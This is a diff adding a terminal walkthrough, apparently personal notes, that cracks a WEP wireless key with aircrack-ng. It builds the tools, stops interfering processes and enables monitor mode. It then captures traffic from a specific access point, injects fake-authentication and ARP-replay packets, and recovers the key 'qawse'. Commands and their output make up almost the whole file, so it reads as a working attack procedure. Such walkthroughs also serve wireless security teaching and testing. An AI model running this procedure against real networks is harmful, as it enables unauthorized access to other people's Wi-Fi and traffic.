@@ -1,0 +1,89 @@
+$ sudo apt-get install build-essential libssl-dev subversion checkinstall
+$ svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng
+$ cd aircrack-ng
+$ make
+$ sudo make install
+$ sudo airodump-ng-oui-update
+
+$ sudo airmon-ng check
+
+# airmon-ng check
+
+
+Found 5 processes that could cause trouble.
+If airodump-ng, aireplay-ng or airtun-ng stops working after
+a short period of time, you may want to kill (some of) them!
+-e 
+PID	Name
+1303	NetworkManager
+1309	avahi-daemon
+1311	avahi-daemon
+1411	wpa_supplicant
+2064	dhclient
+
+# /etc/init.d/network-manager stop
+
+# /etc/init.d/avahi-daemon stop
+
+# kill 1411
+
+# kill 2064
+
+# airmon-ng check
+
+# airmon-ng 
+
+Interface	Chipset		Driver
+
+wlan1		Ralink RT2870/3070	rt2800usb - [phy0]
+
+# airmon-ng start wlan1
+
+Interface	Chipset		Driver
+
+wlan1		Ralink RT2870/3070	rt2800usb - [phy0]
+				(monitor mode enabled on mon0)
+
+# airodump-ng mon0
+
+N: In order to sniff data packets going to and fro from this access point, we need to
+lock our wireless card on the same channel that is channel, 11. To do this run the
+command iwconfig mon0 channel 11 and then run iwconfig mon0 to verify
+the same. You should see the value Frequency: 2.462 GHz in the output. This
+corresponds to Channel 11:
+
+
+# airodump-ng mon0 --bssid 00:1d:1a:07:cb:83 -c 11 -w apup00
+
+N: Injection test
+# aireplay-ng -9 mon0
+18:10:52  Trying broadcast probe requests...
+18:10:52  Injection is working!
+18:10:53  Found 1 AP 
+
+18:10:53  Trying directed probe requests...
+18:10:53  00:1D:1A:07:CB:8E - channel: 11 - 'apup00'
+18:10:54  Ping (min/avg/max): 1.350ms/15.922ms/24.543ms Power: -45.73
+18:10:54  30/30: 100%
+
+
+# aireplay-ng -1 3 -a 00:1D:1A:07:CB:8E  mon0 --ignore-negative-one -e apup00
+# aireplay-ng -3 -b 00:1D:1A:07:CB:8E -e apup00 mon0 --ignore-negative-one
+
+$ sudo aircrack-ng apup00-svn-01.cap 
+Opening apup00-svn-01.cap
+Read 215478 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  00:1D:1A:07:CB:8E  apup00                    WEP (45935 IVs)
+   2  64:70:02:A3:6C:4E  adsl-down                 WEP (824 IVs)
+
+Index number of target network ? 1
+
+Opening apup00-svn-01.cap
+Attack will be restarted every 5000 captured ivs.
+Starting PTW attack with 45935 ivs.
+                     KEY FOUND! [ 71:61:77:73:65 ] (ASCII: qawse )
+	Decrypted correctly: 100%
+
